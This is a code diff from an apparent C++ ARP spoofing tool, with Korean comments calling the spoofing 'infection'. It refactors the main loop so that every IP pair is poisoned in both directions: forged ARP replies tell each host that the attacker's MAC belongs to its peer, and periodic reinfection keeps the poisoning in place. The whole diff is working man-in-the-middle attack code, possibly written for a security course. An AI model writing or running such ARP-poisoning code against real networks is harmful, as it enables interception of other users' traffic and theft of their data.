@@ -173,33 +173,44 @@ int main(int argc, char* argv[]) {
 
     vector<Connection> connections;
     for (int i = 2; i + 1 < argc; i += 2) {
-        string sender_ip = argv[i];
-        string target_ip = argv[i + 1];
-
-        Connection conn;
-        conn.sender_ip = Ip(sender_ip);
-        conn.target_ip = Ip(target_ip);
-        conn.sender_mac = get_mac_by_arp(handle, attacker_mac, attacker_ip, sender_ip);
-        conn.target_mac = get_mac_by_arp(handle, attacker_mac, attacker_ip, target_ip);
-
-        EthArpPacket spoof = make_arp_packet(
-            Mac(attacker_mac), conn.sender_mac,
-            Mac(attacker_mac), conn.sender_mac,
-            conn.target_ip, conn.sender_ip,
+        string ip1 = argv[i];
+        string ip2 = argv[i + 1];
+    
+        // 1️⃣ ip1 -> ip2 감염
+        Connection conn1;
+        conn1.sender_ip = Ip(ip1);
+        conn1.target_ip = Ip(ip2);
+        conn1.sender_mac = get_mac_by_arp(handle, attacker_mac, attacker_ip, ip1);
+        conn1.target_mac = get_mac_by_arp(handle, attacker_mac, attacker_ip, ip2);
+    
+        // 감염 패킷: sender에게 target MAC 속이기
+        send_arp_packet(handle, make_arp_packet(
+            Mac(attacker_mac), conn1.sender_mac,
+            Mac(attacker_mac), conn1.sender_mac,
+            conn1.target_ip, conn1.sender_ip,
             false
-        );
-        send_arp_packet(handle, spoof);
-        // target 감염 (추가)
-        EthArpPacket spoof2 = make_arp_packet(
-            Mac(attacker_mac), conn.target_mac,
-            Mac(attacker_mac), conn.target_mac,
-            conn.sender_ip, conn.target_ip,
+        ));
+    
+        connections.push_back(conn1);
+    
+        // 2️⃣ ip2 -> ip1 감염 (역방향)
+        Connection conn2;
+        conn2.sender_ip = Ip(ip2);
+        conn2.target_ip = Ip(ip1);
+        conn2.sender_mac = conn1.target_mac; // 이미 얻음
+        conn2.target_mac = conn1.sender_mac; // 이미 얻음
+    
+        // 감염 패킷: target에게 sender MAC 속이기
+        send_arp_packet(handle, make_arp_packet(
+            Mac(attacker_mac), conn2.sender_mac,
+            Mac(attacker_mac), conn2.sender_mac,
+            conn2.target_ip, conn2.sender_ip,
             false
-        );
-        send_arp_packet(handle, spoof2);
-
-        connections.push_back(conn);
+        ));
+    
+        connections.push_back(conn2);
     }
+
 
 #if ENABLE_PERIODIC_REINFECTION
     ReinfectArgs* args = new ReinfectArgs{handle, &connections, Mac(attacker_mac)};
